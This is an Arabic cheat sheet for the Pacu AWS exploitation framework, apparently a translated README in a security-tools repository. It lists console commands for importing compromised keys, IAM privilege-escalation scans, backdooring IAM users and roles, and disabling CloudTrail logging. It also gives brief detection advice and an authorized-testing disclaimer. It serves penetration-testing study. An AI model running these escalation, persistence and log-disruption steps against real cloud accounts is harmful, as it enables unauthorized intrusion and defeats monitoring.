<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ☁️ باكو - ورقة الغش الكاملة

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██████╗  █████╗  ██████╗██╗   ██╗
  ██╔══██╗██╔══██╗██╔════╝██║   ██║
  ██████╔╝███████║██║     ██║   ██║
  ██╔═══╝ ██╔══██║██║     ██║   ██║
  ██║     ██║  ██║╚██████╗╚██████╔╝
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
       The AWS Exploitation Framework by Rhino Security Labs
```
<p align="center">
  <img src="https://img.shields.io/badge/Pacu-AWS_Exploitation-blue?style=for-the-badge" alt="Pacu">
  <img src="https://img.shields.io/badge/Author-Rhino_Security_Labs-orange?style=for-the-badge" alt="Rhino Security Labs">
  <img src="https://img.shields.io/badge/Platform-Amazon_Web_Services-gold?style=for-the-badge" alt="AWS">
  <img src="https://img.shields.io/badge/Category-Cloud_Security-green?style=for-the-badge" alt="Cloud Security">
</ص>

<p align="center">
  <b>☁️ إطار استغلال AWS مفتوح المصدر المصمم لاختبار الاختراق في البيئات السحابية، وتصعيد الامتيازات، وجمع بيانات الاعتماد، واستطلاع البنية التحتية</b>
</ص>

---

## 📋 جدول المحتويات

- [نظرة عامة والهندسة المعمارية](#-نظرة عامة--الهندسة المعمارية)
- [التثبيت](#-التثبيت)
- [إدارة الجلسة واستيراد مفتاح AWS](#-إدارة الجلسة--aws-key-import)
  - [استيراد بيانات الاعتماد المخترقة](#importing-compromised-credentials)
  - [الأدوار المفترضة ورموز الجلسة](#الأدوار المفترضة ورموز الجلسة)
- [وحدات الاستطلاع والتعداد](#-الاستطلاع--وحدات-التعداد)
  - [تعداد أذونات IAM الحالية](#enumeating-current-iam-permissions)
  - [فحص مثيلات EC2 ومستودعات S3](#scanning-ec2-instances--s3-buckets)
- [أساليب تصعيد الامتيازات في AWS](#-تقنيات-تصعيد الامتيازات-in-aws)
  - [الفحص التلقائي لتصعيد الامتيازات](#الفحص التلقائي لتصعيد الامتيازات)
  - [تنفيذ وحدات التصعيد](#executing-escalation-modules)
- [المثابرة والتهرب من الدفاع](#-المثابرة--التهرب من الدفاع)
  - [أدوار ومستخدمي IAM في الباب الخلفي](#backdooring-iam-roles--users)
  - [تعطيل تسجيل CloudTrail](#disrupting-cloudtrail-logging)
- [الجدول المرجعي السريع](#-الجدول المرجعي السريع)
- [الاعتبارات الدفاعية والكشف](#-الاعتبارات الدفاعية--الكشف)
- [إخلاء المسؤولية القانونية](#-إخلاء المسؤولية القانونية)

---

## 🎯 نظرة عامة والهندسة المعمارية

تم إنشاء **Pacu** بواسطة **Rhino Security Labs**، وهو بمثابة "Metasploit لـ AWS". وهو مصمم لمحاكاة تكتيكات الخصومة داخل بيئات Amazon Web Services.

تعمل Pacu باستخدام قاعدة بيانات SQLite محلية تحافظ على الحالة عبر الجلسات الهجومية:
- **خط الأنابيب المعياري:** أكثر من 40 وحدة متخصصة تغطي الاكتشاف والحركة الجانبية وتصعيد الامتيازات والمثابرة والترشيح.
- **تعداد الأذونات:** يحلل سياسات IAM دون تشغيل حدود التنبيه عن طريق اختبار إجراءات واجهة برمجة التطبيقات أو مراجعة السياسات المُدارة المرفقة.
- **Privesc Automation:** يقوم بتقييم مسارات تصعيد إذن IAM المعروفة (مثل `iam:CreateAccessKey`، و`iam:PassRole`، و`iam:AttachUserPolicy`).

---

## 📥 التثبيت
```bash
# Clone the repository
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu

# Install dependencies in virtual environment
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Launch Pacu console
python3 pacu.py
```
---

## 🔑 إدارة الجلسة واستيراد مفتاح AWS

عند إطلاق Pacu، ستدخل إلى وحدة تحكم تفاعلية. إنشاء جلسة أو تحديدها:
```text
Pacu > set_session client_assessment
```
### استيراد بيانات الاعتماد المخترقة
```text
Pacu (client_assessment) > set_keys
Enter Key Alias: compromised_dev
Enter AWS Access Key ID: AKIAIOSFODNN7EXAMPLE
Enter AWS Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Enter AWS Session Token (Optional): 
Enter Default Region: us-east-1
```
### الأدوار المفترضة ورموز الجلسة
```text
# Switch active keys within the session
Pacu (client_assessment) > swap_keys
```
---

## 🔍 وحدات الاستطلاع والتعداد

### تعداد أذونات IAM الحالية
حدد هويتك وما يُسمح لبيانات الاعتماد النشطة بالقيام به:
```text
# Query caller identity and enumerate attached user/group/role policies
Pacu (client_assessment) > run iam__enum_permissions
Pacu (client_assessment) > whoami
```
### فحص مثيلات EC2 ومستودعات S3
```text
# Enumerate all EC2 instances and security groups
Pacu (client_assessment) > run ec2__enum

# Enumerate accessible S3 buckets and identify public read/write permissions
Pacu (client_assessment) > run s3__enum
```
---

## ⚡ تقنيات تصعيد الامتيازات في AWS

يعتمد تصعيد امتيازات AWS على سياسات IAM التي تم تكوينها بشكل خاطئ والتي تسمح للمستخدمين غير الإداريين بمنح أنفسهم أو الكيانات الأخرى حقوقًا إدارية.

### الماسح الضوئي التلقائي لتصعيد الامتيازات
يقوم بمسح أذوناتك المذكورة مقابل أكثر من 21 متجهًا موثقًا لـ AWS privesc:
```text
Pacu (client_assessment) > run iam__privesc_scan
```
*يسلط نموذج الإخراج الضوء على الأذونات الضعيفة مثل `iam:PutUserPolicy` أو `iam:AttachUserPolicy` أو `iam:CreateAccessKey`.*

### تنفيذ وحدات التصعيد
```text
# Exploit iam:AttachUserPolicy to attach AdministratorAccess
Pacu (client_assessment) > run iam__privesc_scan --exec

# Exploit iam:CreateAccessKey to create keys for another high-priv user
Pacu (client_assessment) > run iam__backdoor_users_keys --username target_admin
```
---

## 🛡️ المثابرة والمراوغة الدفاعية

### الباب الخلفي لأدوار ومستخدمي IAM
```text
# Add a new access key to an existing user for persistent access
Pacu (client_assessment) > run iam__backdoor_users_keys --username backup_service

# Modify assume-role trust policy to allow external account access
Pacu (client_assessment) > run iam__backdoor_assume_role --role-name ProductionSupport --external-account-id 123456789012
```
### تعطيل تسجيل CloudTrail
```text
# Identify CloudTrail trails
Pacu (client_assessment) > run cloudtrail__enum

# Stop logging on active trails to blind SOC monitors
Pacu (client_assessment) > run cloudtrail__disrupt_logging --trail-name CorpSecurityTrail
```
---

## ⚡ جدول مرجعي سريع

| الهدف | أمر باكو |
|-----------|--------------|
| **ضبط/تحديد الجلسة** | `set_session <NAME>` |
| ** استيراد بيانات اعتماد AWS ** | `set_keys` |
| **إظهار الهوية الحالية** | `whoami` |
| **تعداد حقوق IAM** | `run iam__enum_permissions` |
| **البحث عن ناقلات Privesc** | `run iam__privesc_scan` |
| **تعداد جرافات S3** | `run s3__enum` |
| **تعداد مثيلات EC2** | `run ec2__enum` |
| ** تعطيل CloudTrail ** | `run cloudtrail__disrupt_logging` |
| ** قائمة الوحدات المتاحة ** | `list` |

---

## 🛡️ الاعتبارات الدفاعية والكشوفات

1. ** مراقبة GuardDuty وCloudTrail: ** يؤدي تصعيد الامتيازات التلقائي وفحص الأذونات من Pacu إلى إنشاء استعلامات API تسلسلية سريعة يتم وضع علامة عليها بسهولة بواسطة AWS GuardDuty.
2. **SCP وحدود الأذونات:** فرض سياسات التحكم في خدمة مؤسسات AWS (SCPs) التي تمنع أي مدير - بما في ذلك المسؤولين الكاملين - من التلاعب بـ CloudTrail أو تعديل هياكل المؤسسة الجذرية.

---

## ⚠️إخلاء المسؤولية القانونية

> [!تنبيه]
> تم تصميم Pacu خصيصًا لاختبارات اختراق AWS المعتمدة وتقييمات الأمان. إن اختبار الحسابات السحابية دون الحصول على إذن مسبق صريح من مالك الأصل ينتهك سياسة الاستخدام المقبول لشركة Amazon Web Services والقانون الدولي.